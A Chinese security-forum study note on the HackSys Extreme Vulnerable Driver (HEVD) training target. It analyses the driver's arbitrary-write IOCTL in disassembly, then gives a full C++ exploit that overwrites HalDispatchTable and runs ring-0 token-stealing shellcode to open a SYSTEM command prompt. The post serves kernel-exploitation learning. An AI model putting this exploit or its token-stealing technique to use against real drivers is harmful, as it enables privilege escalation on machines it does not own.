> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270176.htm)

> [原创]HEVD 学习笔记 ------ 任意地址写入

一. 前言
=====

实验环境与 HEVD 介绍请看:[HEVD 学习笔记 ------ 概述](https://bbs.pediy.com/thread-270159.htm)。  

二. 漏洞原理  

==========

这种漏洞之所以存在，是因为没有对要修改保存内容的地址进行检查，看看这个地址中的内容是否可以被更改。又由于在内核中，程序拥有的权限可以让它修改任意地址中的内容，所以它可以将保存了系统函数的地址作为输出地址来修改这个函数的地址。  

详细内容请看:[0day 书中内核漏洞 exploitme.sys 的学习记录](https://bbs.pediy.com/thread-270055.htm)。  

三. 漏洞分析  

==========

HEVD 中存在任意地址写入漏洞的是函数地址表中的第三个函数，所以 IOCTL 等于 0x222003 + 2 * 4。  

```
PAGE:004440F1 loc_4440F1:                             ; CODE XREF: DispatchIoCtrl+34↑j
PAGE:004440F1                                         ; DATA XREF: PAGE:Func_Table↓o
PAGE:004440F1                 mov     esi, ds:DbgPrintEx ; jumptable 00444098 case 2236427
PAGE:004440F7                 push    offset aHevdIoctlArbit ; "****** HEVD_IOCTL_ARBITRARY_WRITE *****"...
PAGE:004440FC                 push    3               ; Level
PAGE:004440FE                 push    4Dh             ; ComponentId
PAGE:00444100                 call    esi ; DbgPrintEx
PAGE:00444102                 add     esp, 0Ch
PAGE:00444105                 push    ebx             ; 将CurrentStackLocation指针入栈
PAGE:00444106                 push    edi             ; 将IRP的指针入栈
PAGE:00444107                 call    ArbitraryWriteIoCtrl
PAGE:0044410C                 push    offset aHevdIoctlArbit ; "****** HEVD_IOCTL_ARBITRARY_WRITE *****"...
PAGE:00444111                 jmp     short loc_4440BF

```

要触发该漏洞，只需要将 IRP 的指针入栈以后调用 ArbitraryWriteIoCtrl 函数。  

```
PAGE:00444BCE ArbitraryWriteIoCtrl proc near          ; CODE XREF: DispatchIoCtrl+A3↑p
PAGE:00444BCE
PAGE:00444BCE arg_CurrentStackLocation= dword ptr  0Ch
PAGE:00444BCE
PAGE:00444BCE                 push    ebp
PAGE:00444BCF                 mov     ebp, esp
PAGE:00444BD1                 mov     eax, [ebp+arg_CurrentStackLocation]
PAGE:00444BD4                 mov     ecx, STATUS_UNSUCCESSFUL
PAGE:00444BD9                 mov     eax, [eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.Type3InputBuffer]
PAGE:00444BDC                 test    eax, eax
PAGE:00444BDE                 jz      short loc_444BE8
PAGE:00444BE0                 push    eax             ; void *
PAGE:00444BE1                 call    TriggerArbitraryWrite
PAGE:00444BE6                 mov     ecx, eax
PAGE:00444BE8
PAGE:00444BE8 loc_444BE8:                             ; CODE XREF: ArbitraryWriteIoCtrl+10↑j
PAGE:00444BE8                 mov     eax, ecx
PAGE:00444BEA                 pop     ebp
PAGE:00444BEB                 retn    8
PAGE:00444BEB ArbitraryWriteIoCtrl endp

```

而在 ArbitraryWriteIoCtrl 函数中，函数会将输入缓冲区的地址取出入栈，随后调用 TriggerArbitraryWrite 函数来触发漏洞。

```
PAGE:00444BEE ; int __stdcall TriggerArbitraryWrite(void *)
PAGE:00444BEE TriggerArbitraryWrite proc near         ; CODE XREF: ArbitraryWriteIoCtrl+13↑p
PAGE:00444BEE
PAGE:00444BEE var_20          = dword ptr -20h
PAGE:00444BEE var_1C          = dword ptr -1Ch
PAGE:00444BEE ms_exc          = CPPEH_RECORD ptr -18h
PAGE:00444BEE arg_InputBuffer = dword ptr  8
PAGE:00444BEE
PAGE:00444BEE ; __unwind { // __SEH_prolog4
PAGE:00444BEE                 push    10h
PAGE:00444BF0                 push    offset stru_402360
PAGE:00444BF5                 call    __SEH_prolog4
PAGE:00444BFA                 xor     eax, eax
PAGE:00444BFC                 mov     [ebp+var_1C], eax
PAGE:00444BFF ;   __try { // __except at loc_444C71
PAGE:00444BFF                 mov     [ebp+ms_exc.registration.TryLevel], eax
PAGE:00444C02                 push    1               ; Alignment
PAGE:00444C04                 push    8               ; Length
PAGE:00444C06                 mov     esi, [ebp+arg_InputBuffer] ; 将输入缓冲区的指针赋给esi
PAGE:00444C09                 push    esi             ; Address
PAGE:00444C0A                 call    ds:ProbeForRead ; 验证输入缓冲区是否可读
PAGE:00444C10                 mov     edi, [esi]      ; 输入缓冲区前4字节数据给edi
PAGE:00444C12                 mov     ebx, [esi+4]    ; 输入缓冲区后4字节数据给ebx

```

在该函数中，首先会对输入缓冲区的前 8 字节的数据进行检查是否可读，随后就将这 8 字节的数据取出，分别赋值到 edi 和 ebx 中。  

```
PAGE:00444C5D                 mov     eax, [edi]      ; 将edi保存的地址中的内容给eax
PAGE:00444C5F                 mov     [ebx], eax      ; 将ebx保存的地址中内容赋值为eax

```

随后程序就会将 ebx 保存的地址中的内容赋值为 edi 保存的地址中的内容。  

由此可以知道这段代码做的事情就是将输入缓冲区前 4 字节保存的地址中的内容赋给输入缓冲区后 4 字节保存的地址中的内容。由于整个过程并没有对输入缓冲区后 4 字节保存的地址进行可写检查，所以完全可以利用该漏洞实现提权。

四. 漏洞利用  

==========

根据上述的内容，可以得出下面的代码来实现提权  

```
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include  #include  #include  #include "ntapi.h"
#pragma comment(linker, "/defaultlib:ntdll.lib")
 
#define LINK_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define INPUT_BUFFER_LENGTH 8
#define PAGE_SIZE 0x1000
#define KERNEL_NAME_LENGTH 0X0D
 
void ShowError(PCHAR msg, NTSTATUS status);
NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength);
 
BOOL g_bIsExecute = FALSE;
 
int main()
{
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hDevice = NULL;
    DWORD dwReturnLength = 0;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CONST DWORD dwIoCtl = 0x222003 + 2 * 4;
    PVOID ShellCodeAddress = NULL;
    PSYSTEM_MODULE_INFORMATION pModuleInformation = NULL;
    DWORD dwImageBase = 0, ShellCodeSize = PAGE_SIZE;
    PVOID pMappedBase = NULL;
    UCHAR szImageName[KERNEL_NAME_LENGTH] = { 0 };
    UNICODE_STRING uDllName;
    PVOID pHalDispatchTable = NULL, pXHalQuerySystemInformation = NULL;
    DWORD dwDllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
 
    // 获得0地址的内存
    ShellCodeAddress = (PVOID)sizeof(ULONG);
    status = NtAllocateVirtualMemory(NtCurrentProcess(),
                                     &ShellCodeAddress,
                                     0,
                                     &ShellCodeSize,
                                     MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                                     PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        printf("NtAllocateVirtualMemory Error 0x%X\n", status);
        goto exit;
    }
 
    // 将ShellCode写到申请的0地址空间中
    RtlMoveMemory(ShellCodeAddress, (PVOID)Ring0ShellCode, ShellCodeSize);
 
 
    // 此时dwReturnLength是0，所以函数会由于长度为0执行失败
    // 然后系统会在第四个参数指定的地址保存需要的内存大小
    status = ZwQuerySystemInformation(SystemModuleInformation,
                                      pModuleInformation,
                                      dwReturnLength,
                                      &dwReturnLength);
 
    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        ShowError("ZwQuerySystemInformation", status);
        goto exit;
    }
 
    // 按页大小对齐
    dwReturnLength = (dwReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
    pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL,
                                                                  dwReturnLength,
                                                                  MEM_COMMIT | MEM_RESERVE,
                                                                  PAGE_READWRITE);
    if (!pModuleInformation)
    {
        printf("VirtualAlloc Error");
        goto exit;
    }
 
    status = ZwQuerySystemInformation(SystemModuleInformation,
                                      pModuleInformation,
                                      dwReturnLength,
                                      &dwReturnLength);
    if (!NT_SUCCESS(status))
    {
        ShowError("ZwQuerySystemInformation", status);
        goto exit;
    }
 
    // 模块加载的基地址
    dwImageBase = (DWORD)(pModuleInformation->Module[0].Base);
 
    // 获取模块名
    RtlMoveMemory(szImageName,
        (PVOID)(pModuleInformation->Module[0].ImageName + pModuleInformation->Module[0].PathLength),
        KERNEL_NAME_LENGTH);
    // 转换为UNICODE_STRING类型
    RtlCreateUnicodeStringFromAsciiz(&uDllName, (PUCHAR)szImageName);
 
    status = (NTSTATUS)LdrLoadDll(NULL,
                                  &dwDllCharacteristics,
                                  &uDllName,
                                  &pMappedBase);
 
    if (!NT_SUCCESS(status))
    {
        ShowError("LdrLoadDll", status);
        goto exit;
    }
 
    // 获取内核HalDispatchTable函数表地址
    pHalDispatchTable = GetProcAddress((HMODULE)pMappedBase, "HalDispatchTable");
 
    if (pHalDispatchTable == NULL)
    {
        printf("GetProcAddress Error\n");
        goto exit;
    }
 
    pHalDispatchTable = (PVOID)((DWORD)pHalDispatchTable - (DWORD)pMappedBase + dwImageBase);
    pXHalQuerySystemInformation = (PVOID)((DWORD)pHalDispatchTable + sizeof(ULONG));
 
    // 打开驱动设备
    hDevice = CreateFile(LINK_NAME,
                         GENERIC_READ | GENERIC_WRITE,
                         0,
                         NULL,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile Error");
        goto exit;
    }
 
    DWORD dwZero = 0;
    DWORD dwInput[2] = { (DWORD)&dwZero, (DWORD)pXHalQuerySystemInformation };
    // 与驱动设备进行交互
    if (!DeviceIoControl(hDevice,
                         dwIoCtl,
                         dwInput,
                         INPUT_BUFFER_LENGTH,
                         NULL,
                         0,
                         &dwReturnLength,
                         NULL))
    {
        printf("DeviceIoControl Error");
        goto exit;
    }
 
    status = NtQueryIntervalProfile(ProfileTotalIssues, NULL);
    if (!NT_SUCCESS(status))
    {
        ShowError("NtQueryIntervalProfile", status);
        goto exit;
    }
 
    if (g_bIsExecute)
    {
        printf("Ring0 代码执行完成\n");
    }
 
    si.cb = sizeof(si);
    if (!CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
                       NULL,
                       NULL,
                       NULL,
                       FALSE,
                       CREATE_NEW_CONSOLE,
                       NULL,
                       NULL,
                       &si,
                       &pi))
    {
        printf("CreateProcess Error\n");
        goto exit;
    }
 
exit:
    if (pModuleInformation) VirtualFree(pModuleInformation, dwReturnLength, MEM_DECOMMIT | MEM_RELEASE);
    if (hDevice) NtClose(hDevice);
    if (pMappedBase) LdrUnloadDll(pMappedBase);
    system("pause");
 
    return 0;
}
 
void ShowError(PCHAR msg, NTSTATUS status)
{
    printf("%s Error 0x%X\n", msg, status);
}
 
NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)
{
    // 关闭页保护
    __asm
    {
        cli
        mov eax, cr0
        and eax, ~0x10000
        mov cr0, eax
    }
 
    __asm
    {
        // 取当前线程
        mov eax, fs:[0x124]
        // 取线程对应的EPROCESS
        mov esi, [eax + 0x150]
        mov eax, esi
    searchWin7:
        mov eax, [eax + 0xB8]
        sub eax, 0x0B8
        mov edx, [eax + 0xB4]
        cmp edx, 0x4
        jne searchWin7
        mov eax, [eax + 0xF8]
        mov [esi + 0xF8], eax
    }
 
    // 开起页保护
    __asm
    {
        mov eax, cr0
        or eax, 0x10000
        mov cr0, eax
        sti
    }
 
    g_bIsExecute = TRUE;
} 
```

运行程序以后可以看到，成功提权  

![](https://bbs.pediy.com/upload/attach/202111/835440_V6S7XEURQS5NX9Q.jpg)

[【公告】【iPhone 13 大奖等你拿】看雪. 众安 2021 KCTF 秋季赛 防守篇 - 征题倒计时（11 月 14 日截止）！](https://bbs.pediy.com/thread-269228.htm)

最后于 1 小时前 被 1900 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Windows](forum-150-1-160.htm)